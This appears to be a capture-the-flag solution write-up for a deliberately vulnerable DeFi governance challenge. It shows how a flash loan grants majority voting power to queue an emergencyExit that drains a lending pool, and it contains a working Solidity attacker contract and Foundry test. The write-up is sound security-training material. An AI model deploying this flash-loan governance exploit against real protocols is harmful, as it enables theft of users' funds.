## `flashLoan` Can Be Used to Acquire Voting Power and Execute an Arbitrary `emergencyExit`

To queue an action, a user must possess more than 50% of the total supply of voting tokens. The total supply is 2 million tokens, and a flash loan can be used to acquire up to 1.5 million tokens, which represents 75% of the total supply.

This allows any attacker to temporarily gain the necessary voting power to queue and execute a malicious `emergencyExit` action, potentially draining all funds from the contract.

### PoC
First, we create a malicious borrower smart contract, with a function `onFlashLoan`, that will have the attack logic:
```solidity
contract Borrower is IERC3156FlashBorrower {
    SimpleGovernance gov;
    address pool;
    address recovery;

    constructor(address _gov, address _pool, address _recovery){
        gov = SimpleGovernance(_gov);
        pool = _pool;
        recovery = _recovery;
    }

    function onFlashLoan(
        address /*initiator*/,
        address token,
        uint256 amount,
        uint256 /*fee*/,
        bytes calldata /*data*/
    ) external returns (bytes32) {
        // delegate the borrowed tokens to 'this' (so `token.getVotes` returns such amount) 
        DamnValuableVotes(token).delegate(address(this));
        // prepare malicious call data
        bytes memory data = abi.encodeWithSignature('emergencyExit(address)', recovery);
        // queue the action
        gov.queueAction(pool,0,data);
        // approve and return to avoid tx to fail 
        DamnValuableVotes(token).approve(msg.sender, amount);
        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }
}
```

Then use it on the test case:
```solidity
    function test_selfie() public 
    checkSolvedByPlayer 
    {
        // deploy borrower contract
        Borrower borrower = new Borrower(address(governance), address(pool), recovery);

        // request a flashloan (the callback 'onFlashLoan' has the logic the queue our malicious action) 
        pool.flashLoan(borrower, address(token), pool.maxFlashLoan(address(token)), '');
        // after delay period ends, execute the action
        vm.warp(2 days + 1);
        governance.executeAction(1);
    }
```


